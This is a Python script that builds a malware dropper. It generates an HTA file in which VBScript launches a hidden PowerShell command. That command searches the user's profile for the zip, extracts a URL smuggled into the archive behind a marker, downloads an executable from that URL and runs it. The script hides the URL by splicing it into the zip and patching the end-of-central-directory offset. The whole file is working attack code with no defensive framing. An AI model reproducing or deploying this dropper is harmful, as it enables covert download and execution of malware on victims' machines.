import struct
import zipfile
import os

EGG = b'\x55\x55\x55\x55'
TXT_FILE_PATH = "implant_output/url.txt"  # your hardcoded text file location

def find_eocd_offset(zip_data):
    eocd_sig = b'\x50\x4b\x05\x06'
    max_comment_length = 0xFFFF
    search_area = zip_data[-(max_comment_length + 22):]
    rel_offset = search_area.rfind(eocd_sig)
    if rel_offset == -1:
        raise ValueError("EOCD not found")
    return len(zip_data) - len(search_area) + rel_offset


def update_eocd_cd_offset(eocd_data, new_cd_offset):
    return eocd_data[:16] + struct.pack('<I', new_cd_offset) + eocd_data[20:]


def create_hta_file(name, payload_size):
    hta_content = f'''<script language="VBScript">
Sub Window_OnLoad()
Dim shell
Set shell = CreateObject("WScript.Shell")
shell.Run "powershell.exe -WindowStyle Hidden -Command ""$n = '{name}'; $z = (Get-ChildItem -Path $Env:USERPROFILE -Recurse -Include *$n.zip -ErrorAction SilentlyContinue | Select-Object -First 1).FullName; $b = [System.IO.File]::ReadAllBytes($z); $i = (0..($b.Length - 4) | Where-Object {{ $b[$_] -eq 0x55 -and $b[$_+1] -eq 0x55 -and $b[$_+2] -eq 0x55 -and $b[$_+3] -eq 0x55 }})[0] + 4; $chunk = $b[$i..($i+{payload_size}-1)]; $out = Join-Path $Env:TEMP ('$n.txt'); [System.IO.File]::WriteAllBytes($out, $chunk); Start-Sleep -Seconds 1; $url = Get-Content $out; $exePath = Join-Path $Env:TEMP 'dl.exe'; Invoke-WebRequest -Uri $url -OutFile $exePath -UseBasicParsing; Start-Process $exePath""", 0, False
End Sub
</script>'''
    hta_filename = f"{name}.hta"
    with open(hta_filename, 'w') as f:
        f.write(hta_content)
    return hta_filename


def create_zip_with_hta(zipname, hta_file):
    with zipfile.ZipFile(zipname, 'w') as zf:
        zf.write(hta_file, arcname=os.path.basename(hta_file))


def inject_txt_into_zip(zipname, txtfile):
    with open(zipname, 'rb') as f:
        zip_data = f.read()
    with open(txtfile, 'rb') as f:
        hidden_data = f.read()
    hidden_data = EGG + hidden_data

    eocd_offset = find_eocd_offset(zip_data)
    eocd = zip_data[eocd_offset:eocd_offset + 22]
    old_cd_offset = struct.unpack('<I', eocd[16:20])[0]
    new_cd_offset = old_cd_offset + len(hidden_data)

    new_eocd = update_eocd_cd_offset(eocd, new_cd_offset)

    new_zip_data = zip_data[:old_cd_offset] + hidden_data + zip_data[old_cd_offset:eocd_offset] + new_eocd

    with open(zipname, 'wb') as f:
        f.write(new_zip_data)